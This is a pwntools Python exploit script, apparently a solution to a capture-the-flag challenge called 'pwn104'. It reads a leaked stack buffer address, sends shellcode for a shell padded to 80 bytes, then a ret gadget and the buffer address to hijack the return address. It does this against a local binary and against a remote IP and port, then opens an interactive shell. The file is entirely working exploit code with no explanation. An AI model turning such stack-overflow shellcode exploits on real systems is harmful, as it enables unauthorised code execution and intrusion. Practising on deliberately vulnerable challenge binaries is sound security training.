from pwn import *
import time

context.arch = "amd64"
sheell = asm(shellcraft.sh())
ret_gadget = 0x401016

def local_pwn():
    p = process("./pwn.pwn104")
    buffer_addr = str(p.recvline_contains("at")).split("at")[-1].strip(" \"")
    buffer_addr = int(buffer_addr, 0)

    payload = sheell + (80 - len(sheell) ) * b"0" + p64(ret_gadget) + p64(buffer_addr)

    p.send(payload)
    time.sleep(1)
    p.interactive()

def remote_pwn():
    p = remote("10.10.87.75", 9004)
    buffer_addr = str(p.recvline_contains("at")).split("at")[-1].strip(" \"")
    buffer_addr = int(buffer_addr, 0)

    payload = sheell + (80 - len(sheell) ) * b"0" + p64(ret_gadget) + p64(buffer_addr)

    p.send(payload)
    time.sleep(1)
    p.interactive()

remote_pwn()